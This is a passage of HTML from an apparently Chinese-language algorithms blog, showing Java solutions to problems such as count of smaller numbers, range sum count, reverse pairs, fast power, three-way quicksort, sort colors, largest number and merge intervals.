class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">int</span>[] index;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">int</span>[] temp;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">int</span>[] tempIndex;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">int</span>[] ans;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> List&lt;Integer&gt; <span class="title">countSmaller</span><span class="params">(<span class="keyword">int</span>[] nums)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.index = <span class="keyword">new</span> <span class="keyword">int</span>[nums.length];</span><br><span class="line">        <span class="keyword">this</span>.temp = <span class="keyword">new</span> <span class="keyword">int</span>[nums.length];</span><br><span class="line">        <span class="keyword">this</span>.tempIndex = <span class="keyword">new</span> <span class="keyword">int</span>[nums.length];</span><br><span class="line">        <span class="keyword">this</span>.ans = <span class="keyword">new</span> <span class="keyword">int</span>[nums.length];</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; nums.length; ++i) &#123;</span><br><span class="line">            index[i] = i;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">int</span> l = <span class="number">0</span>, r = nums.length - <span class="number">1</span>;</span><br><span class="line">        mergeSort(nums, l, r);</span><br><span class="line">        List&lt;Integer&gt; list = <span class="keyword">new</span> ArrayList&lt;Integer&gt;();</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> num : ans) &#123;</span><br><span class="line">            list.add(num);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> list;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">mergeSort</span><span class="params">(<span class="keyword">int</span>[] a, <span class="keyword">int</span> l, <span class="keyword">int</span> r)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (l &gt;= r) &#123;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">int</span> mid = (l + r) &gt;&gt; <span class="number">1</span>;</span><br><span class="line">        mergeSort(a, l, mid);</span><br><span class="line">        mergeSort(a, mid + <span class="number">1</span>, r);</span><br><span class="line">        merge(a, l, mid, r);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">merge</span><span class="params">(<span class="keyword">int</span>[] a, <span class="keyword">int</span> l, <span class="keyword">int</span> mid, <span class="keyword">int</span> r)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> i = l, j = mid + <span class="number">1</span>, p = l;</span><br><span class="line">        <span class="keyword">while</span> (i &lt;= mid &amp;&amp; j &lt;= r) &#123;</span><br><span class="line">            <span class="keyword">if</span> (a[i] &lt;= a[j]) &#123;</span><br><span class="line">                temp[p] = a[i];</span><br><span class="line">                tempIndex[p] = index[i];</span><br><span class="line">                ans[index[i]] += (j - mid - <span class="number">1</span>);</span><br><span class="line">                ++i;</span><br><span class="line">                ++p;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                temp[p] = a[j];</span><br><span class="line">                tempIndex[p] = index[j];</span><br><span class="line">                ++j;</span><br><span class="line">                ++p;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">while</span> (i &lt;= mid)  &#123;</span><br><span class="line">            temp[p] = a[i];</span><br><span class="line">            tempIndex[p] = index[i];</span><br><span class="line">            ans[index[i]] += (j - mid - <span class="number">1</span>);</span><br><span class="line">            ++i;</span><br><span class="line">            ++p;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">while</span> (j &lt;= r) &#123;</span><br><span class="line">            temp[p] = a[j];</span><br><span class="line">            tempIndex[p] = index[j];</span><br><span class="line">            ++j;</span><br><span class="line">            ++p;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> k = l; k &lt;= r; ++k) &#123;</span><br><span class="line">            index[k] = tempIndex[k];</span><br><span class="line">            a[k] = temp[k];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="8-区间和的个数"><a href="#8-区间和的个数" class="headerlink" title="8. 区间和的个数"></a>8. 区间和的个数</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">countRangeSum</span><span class="params">(<span class="keyword">int</span>[] nums, <span class="keyword">int</span> lower, <span class="keyword">int</span> upper)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">long</span> s = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">long</span>[] sum = <span class="keyword">new</span> <span class="keyword">long</span>[nums.length + <span class="number">1</span>];</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; nums.length; ++i) &#123;</span><br><span class="line">            s += nums[i];</span><br><span class="line">            sum[i + <span class="number">1</span>] = s;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> countRangeSumRecursive(sum, lower, upper, <span class="number">0</span>, sum.length - <span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">countRangeSumRecursive</span><span class="params">(<span class="keyword">long</span>[] sum, <span class="keyword">int</span> lower, <span class="keyword">int</span> upper, <span class="keyword">int</span> left, <span class="keyword">int</span> right)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (left == right) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">int</span> mid = (left + right) / <span class="number">2</span>;</span><br><span class="line">            <span class="keyword">int</span> n1 = countRangeSumRecursive(sum, lower, upper, left, mid);</span><br><span class="line">            <span class="keyword">int</span> n2 = countRangeSumRecursive(sum, lower, upper, mid + <span class="number">1</span>, right);</span><br><span class="line">            <span class="keyword">int</span> ret = n1 + n2;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 首先统计下标对的数量</span></span><br><span class="line">            <span class="keyword">int</span> i = left;</span><br><span class="line">            <span class="keyword">int</span> l = mid + <span class="number">1</span>;</span><br><span class="line">            <span class="keyword">int</span> r = mid + <span class="number">1</span>;</span><br><span class="line">            <span class="keyword">while</span> (i &lt;= mid) &#123;</span><br><span class="line">                <span class="keyword">while</span> (l &lt;= right &amp;&amp; sum[l] - sum[i] &lt; lower) &#123;</span><br><span class="line">                    l++;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">while</span> (r &lt;= right &amp;&amp; sum[r] - sum[i] &lt;= upper) &#123;</span><br><span class="line">                    r++;</span><br><span class="line">                &#125;</span><br><span class="line">                ret += r - l;</span><br><span class="line">                i++;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 随后合并两个排序数组</span></span><br><span class="line">            <span class="keyword">long</span>[] sorted = <span class="keyword">new</span> <span class="keyword">long</span>[right - left + <span class="number">1</span>];</span><br><span class="line">            <span class="keyword">int</span> p1 = left, p2 = mid + <span class="number">1</span>;</span><br><span class="line">            <span class="keyword">int</span> p = <span class="number">0</span>;</span><br><span class="line">            <span class="keyword">while</span> (p1 &lt;= mid || p2 &lt;= right) &#123;</span><br><span class="line">                <span class="keyword">if</span> (p1 &gt; mid) &#123;</span><br><span class="line">                    sorted[p++] = sum[p2++];</span><br><span class="line">                &#125; <span class="keyword">else</span> <span class="keyword">if</span> (p2 &gt; right) &#123;</span><br><span class="line">                    sorted[p++] = sum[p1++];</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="keyword">if</span> (sum[p1] &lt; sum[p2]) &#123;</span><br><span class="line">                        sorted[p++] = sum[p1++];</span><br><span class="line">                    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                        sorted[p++] = sum[p2++];</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; sorted.length; j++) &#123;</span><br><span class="line">                sum[left + j] = sorted[j];</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> ret;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="9-翻转对"><a href="#9-翻转对" class="headerlink" title="9. 翻转对"></a>9. 翻转对</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">reversePairs</span><span class="params">(<span class="keyword">int</span>[] nums)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span>[] tmp = <span class="keyword">new</span> <span class="keyword">int</span>[nums.length];</span><br><span class="line">        <span class="keyword">return</span> mergeSort(nums, <span class="number">0</span>, nums.length - <span class="number">1</span>, tmp);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">int</span> <span class="title">mergeSort</span><span class="params">(<span class="keyword">int</span>[] nums, <span class="keyword">int</span> lo, <span class="keyword">int</span> hi, <span class="keyword">int</span>[] tmp)</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(lo &gt;= hi) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">int</span> mid = lo + (hi - lo) / <span class="number">2</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">int</span> leftSumCount = mergeSort(nums, lo, mid, tmp);</span><br><span class="line">        <span class="keyword">int</span> rightSumCount = mergeSort(nums, mid + <span class="number">1</span>, hi, tmp);</span><br><span class="line">        <span class="keyword">int</span> count = <span class="number">0</span>;</span><br><span class="line">        <span class="comment">//计算当前翻转对的个数</span></span><br><span class="line">        <span class="keyword">int</span> i = lo;</span><br><span class="line">        <span class="keyword">int</span> j = mid + <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">while</span>(i &lt;= mid)&#123;</span><br><span class="line">            <span class="keyword">while</span>(j &lt;= hi &amp;&amp; (<span class="keyword">long</span>)nums[i] &gt; <span class="number">2</span> * (<span class="keyword">long</span>)nums[j]) j++;</span><br><span class="line">            count += (j - mid - <span class="number">1</span>);</span><br><span class="line">            i++;</span><br><span class="line">        &#125;</span><br><span class="line">        merge(nums, lo, mid, hi, tmp);</span><br><span class="line">        <span class="keyword">return</span> leftSumCount + rightSumCount + count;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">merge</span><span class="params">(<span class="keyword">int</span>[] nums, <span class="keyword">int</span> lo, <span class="keyword">int</span> mid, <span class="keyword">int</span> hi, <span class="keyword">int</span>[] tmp)</span></span>&#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = lo; i &lt;= hi; i++)&#123;</span><br><span class="line">            tmp[i] = nums[i];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">int</span> i = lo; </span><br><span class="line">        <span class="keyword">int</span> j = mid +<span class="number">1</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> k = lo; k &lt;= hi; k++)&#123;</span><br><span class="line">            <span class="keyword">if</span>(i == mid + <span class="number">1</span>) nums[k] = tmp[j++];</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span>(j == hi + <span class="number">1</span>) nums[k] = tmp[i++];</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span>(tmp[i] &lt;= tmp[j]) nums[k] = tmp[i++];</span><br><span class="line">            <span class="keyword">else</span> nums[k] = tmp[j++];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="10-Pow-x-n"><a href="#10-Pow-x-n" class="headerlink" title="10. Pow(x,n)"></a>10. Pow(x,n)</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="comment">//快速幂 O(log n)</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">double</span> <span class="title">myPow</span><span class="params">(<span class="keyword">double</span> x, <span class="keyword">int</span> n)</span> </span>&#123;</span><br><span class="line">        <span class="comment">//使用 long 来存储 n，因为 -n 可能会越界</span></span><br><span class="line">        <span class="keyword">long</span> b = n;</span><br><span class="line">        <span class="keyword">if</span>(b &lt; <span class="number">0</span>)&#123;</span><br><span class="line">            x = <span class="number">1</span> /x;</span><br><span class="line">            b = -b;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> quickPow(x, b);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">double</span> <span class="title">quickPow</span><span class="params">(<span class="keyword">double</span> x, <span class="keyword">long</span> n)</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(n == <span class="number">0</span>) <span class="keyword">return</span> <span class="number">1.0</span>;</span><br><span class="line">        <span class="keyword">if</span>(n == <span class="number">1</span>) <span class="keyword">return</span> x;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">long</span> mid = n /<span class="number">2</span>;</span><br><span class="line">        <span class="keyword">double</span> y = quickPow(x, mid);</span><br><span class="line">        <span class="keyword">return</span> n % <span class="number">2</span> == <span class="number">0</span> ? y * y : x * y * y;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="11-三路快排"><a href="#11-三路快排" class="headerlink" title="11. 三路快排"></a>11. 三路快排</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 三路快排</span></span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">quickSort1</span><span class="params">(<span class="keyword">int</span>[] nums, <span class="keyword">int</span> lo, <span class="keyword">int</span> hi)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (lo &gt;= hi) <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> j = <span class="keyword">new</span> Random().nextInt(hi - lo + <span class="number">1</span>) + lo; <span class="comment">// 随机选一个作为 pivot</span></span><br><span class="line">    swap(nums, j, hi);</span><br><span class="line">    <span class="keyword">int</span> pivot = nums[hi];</span><br><span class="line">    <span class="keyword">int</span> less = lo, great = hi;</span><br><span class="line">    <span class="keyword">int</span> i = lo;</span><br><span class="line">    <span class="keyword">while</span> (i &lt;= great) &#123;</span><br><span class="line">        <span class="keyword">if</span> (nums[i] &lt; pivot) &#123;</span><br><span class="line">            swap(nums, i, less);</span><br><span class="line">            less++;</span><br><span class="line">            i++;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (nums[i] &gt; pivot) &#123;</span><br><span class="line">            swap(nums, i, great);</span><br><span class="line">            great--;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            i++;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    quickSort1(nums, lo, less - <span class="number">1</span>);</span><br><span class="line">    quickSort1(nums, great + <span class="number">1</span>, hi);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="12-颜色分类"><a href="#12-颜色分类" class="headerlink" title="12. 颜色分类"></a>12. 颜色分类</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">sortColors</span><span class="params">(<span class="keyword">int</span>[] nums)</span> </span>&#123;</span><br><span class="line">        <span class="comment">//计数</span></span><br><span class="line">        <span class="keyword">int</span>[] count = <span class="keyword">new</span> <span class="keyword">int</span>[<span class="number">3</span>];</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> num : nums)&#123;</span><br><span class="line">            count[num]++;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//排序</span></span><br><span class="line">        <span class="keyword">int</span> k = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt;= <span class="number">2</span>; i++)&#123;</span><br><span class="line">            <span class="keyword">int</span> num = count[i];</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> j = <span class="number">1</span>; j &lt;= num; j++)&#123;</span><br><span class="line">                nums[k++] = i;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="13-最大数"><a href="#13-最大数" class="headerlink" title="13. 最大数"></a>13. 最大数</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 自定义排序</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">largestNumber</span><span class="params">(<span class="keyword">int</span>[] nums)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">        sort(nums, <span class="number">0</span>, nums.length - <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">        StringBuilder sb = <span class="keyword">new</span> StringBuilder();</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> str : nums) &#123;</span><br><span class="line">            sb.append(str);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (sb.charAt(<span class="number">0</span>) == <span class="string">'0'</span>) <span class="keyword">return</span> <span class="string">"0"</span>;</span><br><span class="line">        <span class="keyword">return</span> sb.toString();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">sort</span><span class="params">(<span class="keyword">int</span>[] data, <span class="keyword">int</span> lo, <span class="keyword">int</span> hi)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (lo &gt;= hi) <span class="keyword">return</span>;</span><br><span class="line">        <span class="comment">// 分区</span></span><br><span class="line">        <span class="keyword">int</span> pivot = data[hi];</span><br><span class="line"></span><br><span class="line">        <span class="keyword">int</span> less = lo;</span><br><span class="line">        <span class="keyword">int</span> great = hi;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">int</span> i = lo;</span><br><span class="line">        <span class="keyword">while</span> (i &lt;= great) &#123;</span><br><span class="line">            <span class="keyword">if</span> ((data[i] + <span class="string">""</span> + pivot).compareTo(pivot + <span class="string">""</span> + data[i]) &gt; <span class="number">0</span>) &#123;</span><br><span class="line">                swap(data, i, less);</span><br><span class="line">                less++;</span><br><span class="line">                i++;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> ((data[i] + <span class="string">""</span> + pivot).compareTo(pivot + <span class="string">""</span> + data[i]) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">                swap(data, i, great);</span><br><span class="line">                great--;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                i++;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        sort(data, lo, less - <span class="number">1</span>);</span><br><span class="line">        sort(data, great +<span class="number">1</span>, hi);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">swap</span><span class="params">(<span class="keyword">int</span>[] strs, <span class="keyword">int</span> i, <span class="keyword">int</span> j)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> tmp = strs[i];</span><br><span class="line">        strs[i] = strs[j];</span><br><span class="line">        strs[j] = tmp;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//用Java的库函数排序</span></span><br><span class="line"><span class="keyword">import</span> java.util.Arrays;</span><br><span class="line"><span class="keyword">import</span> java.util.Comparator;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">largestNumber</span><span class="params">(<span class="keyword">int</span> [] nums)</span></span>&#123;</span><br><span class="line">        String[] strs = <span class="keyword">new</span> String[nums.length];</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; nums.length; i++)&#123;</span><br><span class="line">            strs[i] = String.valueOf(nums[i]);</span><br><span class="line">        &#125;</span><br><span class="line">        Arrays.sort(strs, <span class="keyword">new</span> LargestNumberComparator());</span><br><span class="line">        <span class="keyword">if</span>(strs[<span class="number">0</span>].equals(<span class="string">"0"</span>))&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">"0"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        String s = <span class="keyword">new</span> String();</span><br><span class="line">        <span class="keyword">for</span>(String str : strs)&#123;</span><br><span class="line">            s += str;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> s;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">private</span> <span class="class"><span class="keyword">class</span> <span class="title">LargestNumberComparator</span> <span class="keyword">implements</span> <span class="title">Comparator</span>&lt;<span class="title">String</span>&gt;</span>&#123;</span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">compare</span><span class="params">(String a, String b)</span></span>&#123;</span><br><span class="line">            String s1 = a + b;</span><br><span class="line">            String s2 = b + a;</span><br><span class="line">            <span class="keyword">return</span> s2.compareTo(s1);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="14-合并区间"><a href="#14-合并区间" class="headerlink" title="14. 合并区间"></a>14. 合并区间</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">int</span>[][] merge(<span class="keyword">int</span>[][] intervals) &#123;</span><br><span class="line">        <span class="keyword">if</span>(intervals.length == <span class="number">0</span>) <span class="keyword">return</span> intervals;</span><br><span class="line">        Arrays.sort(intervals,<span class="keyword">new</span> Comparator&lt;<span 